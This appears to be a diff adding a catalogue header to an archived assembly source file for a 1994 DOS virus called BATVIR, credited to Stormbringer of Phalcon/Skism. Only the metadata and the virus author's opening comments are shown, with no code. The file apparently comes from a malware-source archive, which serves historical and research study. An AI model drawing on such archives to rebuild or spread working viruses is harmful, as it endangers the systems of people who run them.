@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;             [BATVIR] '94 (c) 1994 Stormbringer [Phalcon/Skism]
 ;
 ;   This virus is a bit cheesy, but hell.... Believe it or not, I got bored 
